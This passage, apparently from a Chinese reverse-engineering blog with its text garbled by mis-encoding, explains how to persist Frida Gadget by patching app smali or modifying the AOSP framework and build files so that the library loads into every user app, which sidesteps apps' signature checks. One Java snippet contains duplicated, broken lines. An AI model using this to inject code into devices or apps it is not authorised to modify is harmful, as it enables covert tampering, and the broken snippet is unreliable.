href="http://libfrida-gadget.config.so">libfrida-gadget.config.so</a>ï¼Œå†…å®¹ä¸º</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è„šæœ¬æ¨¡å¼ï¼ŒåŠ è½½è¿™ä¸ªjsè„šæœ¬</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;interaction&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>:<span class="string">&quot;script&quot;</span>,</span><br><span class="line">        <span class="string">&quot;path&quot;</span>:<span class="string">&quot;/home/oleavr/explore.js&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è„šæœ¬æ¨¡å¼ï¼ŒåŠ è½½å¤šä¸ªjsè„šæœ¬ï¼Œæ”¾å…¥ä¸€ä¸ªç›®å½•ä¸­</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;interaction&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>:<span class="string">&quot;script-directory&quot;</span>,</span><br><span class="line">        <span class="string">&quot;path&quot;</span>:<span class="string">&quot;/usr/local/frida/scripts&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>appå¦‚ä½•åŠ è½½è¿™ä¸ªlibfrida-gadget.soå‘¢ï¼Ÿ</p><p>æ‰€ä»¥æˆ‘ä»¬è¦ä¿®æ”¹appä»£ç (.dexæ–‡ä»¶)è®©åŸæœ¬appæ¥åŠ è½½è¿™ä¸ªsoæ–‡ä»¶ï¼Œåœ¨appå…¥å£æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š</p><p><img src="/posts/e65d2ab6.htm/image-20240131185225259.png" alt="image-20240131185225259"></p><p>smailå½¢å¼ä¸ºï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#direct methods</span><br><span class="line">.<span class="property">method</span> <span class="keyword">static</span> constructor &lt;clinit&gt;()V</span><br><span class="line">.<span class="property">register</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">.<span class="property">prologue</span></span><br><span class="line"><span class="keyword">const</span>-string v0,<span class="string">&quot;frida-gadget&quot;</span></span><br><span class="line"></span><br><span class="line">invoke-<span class="keyword">static</span> &#123;v0&#125;, <span class="title class_">Ljava</span>/lang/<span class="title class_">System</span>;-&gt;<span class="title function_">loadLibrary</span>(<span class="title class_">Ljava</span>/lang/<span class="title class_">String</span>;)V</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span>-<span class="keyword">void</span></span><br><span class="line">.<span class="property">end</span> method</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨è¿›è¡Œå›ç¼–è¯‘æ‰“åŒ…ã€‚</p><p>ä½†æ˜¯æœ‰äº›appéªŒè¯ç­¾åæˆ–è€…ä¸èƒ½é‡æ‰“åŒ…ã€‚</p><p>æ‰€ä»¥ <strong>é­”æ”¹ç³»ç»Ÿ</strong></p><p>åœ¨appå¯åŠ¨è¿‡ç¨‹ä¸­ï¼Œè‡ªåŠ¨åŠ è½½frida-gadgetï¼Œæ›´é€šç”¨ã€‚</p><h2 id="ä¿®æ”¹appå¯åŠ¨æµç¨‹">ä¿®æ”¹appå¯åŠ¨æµç¨‹</h2><p>åœ¨å®‰å“ç³»ç»Ÿæºç ä¸­çš„ActivityThreadç±»ä¸‹æ‰¾handleBandApplicationæ–¹æ³•ï¼Œåœ¨<code>app=data.info.makeApplication(data.restrictedBackupMode)</code>å‰é¢æ·»åŠ ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">curPkgName</span> <span class="operator">=</span> data.appInfo.packageName;   <span class="comment">//è·å–åŒ…å</span></span><br><span class="line"><span class="type">int</span> <span class="variable">curUid</span> <span class="operator">=</span> Process.myUid();</span><br><span class="line"><span class="keyword">if</span>(curUid&gt;<span class="number">10000</span>)&#123;                               <span class="comment">//ç³»ç»Ÿappä¸€èˆ¬å°äº10000 è¿‡æ»¤ç³»ç»Ÿapp</span></span><br><span class="line">    Persist.LOGD(); <span class="type">String</span> <span class="variable">curPkgName</span> <span class="operator">=</span> data.appInfo.packageName;</span><br><span class="line">        <span class="type">int</span> <span class="variable">curUid</span> <span class="operator">=</span> Process.myUid();</span><br><span class="line">        <span class="keyword">if</span> (curUid &gt; <span class="number">10000</span>) &#123;</span><br><span class="line">            Persist.LOGD(<span class="string">&quot;curPkgName: &quot;</span> + curPkgName + <span class="string">&quot; curUid: &quot;</span> + curUid);</span><br><span class="line">            <span class="type">Boolean</span> <span class="variable">isPersist</span> <span class="operator">=</span> Persist.isEnablePersist(curPkgName);   <span class="comment">//æ˜¯å¦æ³¨å…¥fridagadget</span></span><br><span class="line">            Persist.LOGD(<span class="string">&quot;isPersist: &quot;</span> + isPersist);</span><br><span class="line">            <span class="keyword">if</span> (isPersist) &#123;</span><br><span class="line">                <span class="keyword">if</span>(Persist.doXiaojianbangPersist(appContext, curPkgName))&#123;  <span class="comment">//åŠ è½½fridagadget</span></span><br><span class="line">                    Persist.LOGD(<span class="string">&quot;doXiaojianbangPersist is ok&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    Persist.LOGD(<span class="string">&quot;doXiaojianbangPersist failed&quot;</span>);</span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è‡ªå®šä¹‰åŒ…å’Œç±»">è‡ªå®šä¹‰åŒ…å’Œç±»</h2><p>ä¸Šé¢ä¿®æ”¹appæµç¨‹çš„ä¸€äº›æ–¹æ³•å’ŒPersistç±»æ˜¯è‡ªå®šä¹‰çš„ï¼Œå°†è¿™ä¸ªåŒ…å¯¼å…¥å®‰å“ç³»ç»Ÿæºç ä¸­çš„ActivityThreadç±»ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xiaojianbang;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.os.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.json.JSONObject;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Persist</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SO_NAME</span> <span class="operator">=</span> <span class="string">&quot;libxiaojianbang.so&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SO_CONFIG_NAME</span> <span class="operator">=</span> <span class="string">&quot;libxiaojianbang.config.so&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LIB32_DIR</span> <span class="operator">=</span> <span class="string">&quot;/system/lib&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LIB64_DIR</span> <span class="operator">=</span> <span class="string">&quot;/system/lib64&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SETTINGS_DIR</span> <span class="operator">=</span> <span class="string">&quot;/data/system/xsettings/xiaojianbang/persist&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ENABLE_PERSIST_FILE_NAME</span> <span class="operator">=</span> <span class="string">&quot;xiaojianbang_persist&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CONFIG_JS_DIR</span> <span class="operator">=</span> <span class="string">&quot;/data/system/xsettings/xiaojianbang/jscfg&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CONFIG_JS_FILE_NAME</span> <span class="operator">=</span> <span class="string">&quot;config.js&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG_NAME</span> <span class="operator">=</span> <span class="string">&quot;xiaojianbang_persist&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">LOGD</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        Log.d(TAG_NAME, msg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">saveFile</span><span class="params">(String filePath, String textMsg)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(filePath);</span><br><span class="line">            fileOutputStream.write(textMsg.getBytes(<span class="string">&quot;utf-8&quot;</span>));</span><br><span class="line">            fileOutputStream.flush();</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">copyFile</span><span class="params">(File srcFile, File dstFile)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(srcFile);</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(dstFile);</span><br><span class="line">            <span class="type">byte</span>[] data = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">16</span> * <span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>((len = fileInputStream.read(data)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                fileOutputStream.write(data,<span class="number">0</span>, len);</span><br><span class="line">                fileOutputStream.flush();</span><br><span class="line">            &#125;</span><br><span class="line">            fileInputStream.close();</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// åˆ¤æ–­appæ˜¯å¦æ‰“å¼€è‡ªåŠ¨æ³¨å…¥è„šæœ¬åŠŸèƒ½</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isEnablePersist</span><span class="params">(String pkgName)</span> &#123;</span><br><span class="line">        <span class="comment">// åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨ /data/system/xsettings/xiaojianbang/persist/com.xiaojianbang.app/xiaojianbang_persist</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">enableFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(SETTINGS_DIR, pkgName + File.separator + ENABLE_PERSIST_FILE_NAME);</span><br><span class="line">        <span class="keyword">return</span> enableFile.exists();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// è·å–æºJSæ–‡ä»¶è·¯å¾„</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> File <span class="title function_">getConfigJSPath</span><span class="params">(String pkgName)</span> &#123;</span><br><span class="line">        <span class="comment">// /data/system/xsettings/xiaojianbang/jscfg/com.xiaojianbang.app/config.js</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">File</span>(CONFIG_JS_DIR, pkgName + File.separator + CONFIG_JS_FILE_NAME);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æ‹·è´æºJSæ–‡ä»¶åˆ°appç§æœ‰ç›®å½•</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> File <span class="title function_">copyJSFile</span><span class="params">(Context context, String pkgName)</span> &#123;</span><br><span class="line">        <span class="comment">// åˆ¤æ–­æºJSæ–‡ä»¶æ˜¯å¦å­˜åœ¨</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">srcJSFile</span> <span class="operator">=</span> getConfigJSPath(pkgName);</span><br><span class="line">        <span class="keyword">if</span>(!srcJSFile.exists()) &#123;</span><br><span class="line">            LOGD(<span class="string">&quot;srcJSFile not exists&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// æ‹·è´æºJSæ–‡ä»¶åˆ°appç§æœ‰ç›®å½•</span></span><br><span class="line">        <span class="comment">// /data/data/com.xiaojianbang.app/files/config.js</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">dstJSFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(context.getFilesDir(), CONFIG_JS_FILE_NAME);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isCopyJSOk</span> <span class="operator">=</span> copyFile(srcJSFile, dstJSFile);</span><br><span class="line">        <span class="keyword">if</span>(!isCopyJSOk)&#123;</span><br><span class="line">            LOGD(<span class="string">&quot;copyJSFile fail: &quot;</span> + srcJSFile + <span class="string">&quot; -&gt; &quot;</span> + dstJSFile);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dstJSFile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ç”ŸæˆGadgeté…ç½®æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">genGadgetConfig</span><span class="params">(Context context, File dstJSFile)</span> &#123;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">childObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            childObj.put(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;script&quot;</span>);</span><br><span class="line">            childObj.put(<span class="string">&quot;path&quot;</span>, dstJSFile.toString());</span><br><span class="line">            jsonObject.put(<span class="string">&quot;interaction&quot;</span>, childObj);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">configFilePath</span> <span class="operator">=</span> context.getFilesDir() + File.separator + SO_CONFIG_NAME;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isSaveOk</span> <span class="operator">=</span> saveFile(configFilePath, jsonObject.toString());</span><br><span class="line">        <span class="keyword">if</span>(!isSaveOk)&#123;</span><br><span class="line">            LOGD(<span class="string">&quot;saveFile fail: &quot;</span> + configFilePath);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æ‹·è´æºsoæ–‡ä»¶åˆ°appç§æœ‰ç›®å½•</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> File <span class="title function_">copySoFile</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">        <span class="comment">// åˆ¤æ–­æºsoæ–‡ä»¶æ˜¯å¦å­˜åœ¨</span></span><br><span class="line">        <span class="comment">// /system/lib/libxiaojianbang.so   //ä¸åé¢ä¿®æ”¹â€œhandheld_system.mkâ€è·¯å¾„å¯¹åº”</span></span><br><span class="line">        <span class="comment">// /system/lib64/libxiaojianbang.so</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">srcSoFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(LIB32_DIR, SO_NAME);</span><br><span class="line">        <span class="keyword">if</span>(Process.is64Bit()) &#123;</span><br><span class="line">            srcSoFile = <span class="keyword">new</span> <span class="title class_">File</span>(LIB64_DIR, SO_NAME);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!srcSoFile.exists()) &#123;</span><br><span class="line">            LOGD(<span class="string">&quot;srcSoFile not exists&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// æ‹·è´æºsoæ–‡ä»¶åˆ°appç§æœ‰ç›®å½•</span></span><br><span class="line">        <span class="comment">// /data/data/com.xiaojianbang.app/files/libxiaojianbang.so</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">dstSoFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(context.getFilesDir(), SO_NAME);</span><br><span class="line">        <span class="keyword">if</span>(srcSoFile.length() != dstSoFile.length()) &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isCopyFileOk</span> <span class="operator">=</span> copyFile(srcSoFile, dstSoFile);</span><br><span class="line">            <span class="keyword">if</span>(!isCopyFileOk)&#123;</span><br><span class="line">                LOGD(<span class="string">&quot;copySoFile fail: &quot;</span> + srcSoFile + <span class="string">&quot; -&gt; &quot;</span> + dstSoFile);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dstSoFile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// è¿›è¡ŒFrida GadgetæŒä¹…åŒ–</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">doXiaojianbangPersist</span><span class="params">(Context context, String pkgName)</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">dstJSFile</span> <span class="operator">=</span> copyJSFile(context, pkgName);</span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">null</span> == dstJSFile) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(!genGadgetConfig(context, dstJSFile)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">File</span> <span class="variable">dstSoFile</span> <span class="operator">=</span> copySoFile(context);</span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">null</span> == dstSoFile) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        System.load(dstSoFile.toString());</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="å°†è‡ªå®šä¹‰åŒ…åŠ å…¥ç™½åå•">å°†è‡ªå®šä¹‰åŒ…åŠ å…¥ç™½åå•</h2><p>è‡ªå®šä¹‰åŒ…å’Œç±»ä¸€èˆ¬ä¸ä¼šè¢«ç¼–è¯‘ï¼Œæ‰€ä»¥è¦åŠ å…¥ç™½åå•</p><p>ç™½åå•æ–‡ä»¶è·¯å¾„</p><p><code>/build/make/core/tasks/check_boot_jars/package_whitelist.txt</code></p><p>éšä¾¿åŠ å…¥ä¸€ä¸ªä½ç½®å°±å¯ä»¥</p><h2 id="frida-gadgeté›†æˆåˆ°ç³»ç»Ÿ">frida-gadgeté›†æˆåˆ°ç³»ç»Ÿ</h2><p>fridaå®˜ç½‘ä¸‹è½½32ä½å’Œ64ä½frida-gadgetï¼Œæ”¾åœ¨å®‰å“ç³»ç»Ÿæºç <code>/frameworks/base/cmds/libxiaojianbang</code>ä¸‹</p><p>ä¿®æ”¹æºç ä»¥ä¸‹æ–‡ä»¶<code>/build/make/target/product/handheld_system.mk</code>ï¼Œå°† frida-gadget æ‹·è´åˆ°ç¼–è¯‘ä»¥åçš„ç³»ç»Ÿä¸­</p><p>ä¿®æ”¹å†…å®¹</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="comment">// add</span></span></span><br><span class="line">PRODUCT_COPY_FILES += \</span><br><span class="line">    frameworks<span class="keyword">/base/</span>cmds<span class="keyword">/xiaojianbang/</span>frida-gadget<span class="number">-14.2</span><span class="number">.18</span>-android-arm.so:$(TARGET_COPY_OUT_SYSTEM)<span class="keyword">/lib/</span>libxiaojianbang.so \</span><br><span class="line">    frameworks<span class="keyword">/base/</span>cmds<span class="keyword">/xiaojianbang/</span>frida-gadget<span class="number">-14.2</span><span class="number">.18</span>-android-arm64.so:$(TARGET_COPY_OUT_SYSTEM)<span class="keyword">/lib64/</span>libxiaojianbang.so</span><br><span class="line"><span class="meta"># <span class="comment">// add</span></span></span><br><span class="line"></span><br><span class="line">è¿™æ ·å°±ä¼šæŠŠæºç ä¸­çš„â€œ<span class="keyword">/frameworks/</span>base<span class="keyword">/cmds/</span>libxiaojianbangâ€ä¸‹çš„frida-gadgetæ–‡ä»¶å¯¼å…¥åˆ°ç³»ç»Ÿç›®å½•ä¸‹(å…·ä½“å¯¼å…¥çš„ä½ç½®è¦å’Œå‰é¢è‡ªå®šä¹‰ç±»ä¸­å†™çš„å­˜æ”¾fridagadget.soè·¯å¾„ä¸€è‡´)</span><br></pre></td></tr></table></figure><h2 id="å¼€æœºåˆ›å»ºè‡ªå®šä¹‰ç›®å½•">å¼€æœºåˆ›å»ºè‡ªå®šä¹‰ç›®å½•</h2><p>åœ¨frida-gadgetæŒä¹…åŒ–çš„æ—¶å€™ï¼Œè®²å¸ˆæŠŠ.jsæ–‡ä»¶gadgetçš„é…ç½®æ–‡ä»¶ç­‰æ”¾å…¥äº†è‡ªå®šä¹‰çš„ç›®å½•ä¸‹ï¼Œä¸ºäº†é˜²æ­¢æ¯æ¬¡åˆ·æœºè‡ªå·±æ‰‹åŠ¨åˆ›å»º</p><p>æ‰€ä»¥åœ¨<code>/system/core/rootdir/init.rc æ–‡ä»¶ä¸­æ·»åŠ ä»¥ä¸‹æ•°æ® 625</code>æ·»åŠ ä»¥ä¸‹ï¼š</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="comment">// add</span></span></span><br><span class="line">   <span class="meta"># /data/system/xsettings/xiaojianbang/persist</span></span><br><span class="line">   <span class="keyword">mkdir</span> /data/<span class="keyword">system</span>/xsettings <span class="number">0775</span> <span class="keyword">system</span> <span class="keyword">system</span></span><br><span class="line">   <span class="keyword">mkdir</span> /data/<span class="keyword">system</span>/xsettings/xiaojianbang <span class="number">0775</span> <span class="keyword">system</span> <span class="keyword">system</span></span><br><span class="line">   <span class="keyword">mkdir</span> /data/<span class="keyword">system</span>/xsettings/xiaojianbang/persist <span class="number">0775</span> <span class="keyword">system</span> <span class="keyword">system</span></span><br><span class="line">   <span class="keyword">mkdir</span> /data/<span class="keyword">system</span>/xsettings/xiaojianbang/jscfg <span class="number">0775</span> <span class="keyword">system</span> <span class="keyword">system</span></span><br><span class="line">   <span class="meta"># <span class="comment">// add</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ä¸ºè‡ªå®šä¹‰ç›®å½•å…³è”æ–‡ä»¶ç±»å‹æ ‡ç­¾">ä¸ºè‡ªå®šä¹‰ç›®å½•å…³è”æ–‡ä»¶ç±»å‹æ ‡ç­¾</h2><p>1ï¼‰åˆ›å»ºæ–‡ä»¶ç±»å‹SeLinuxæ 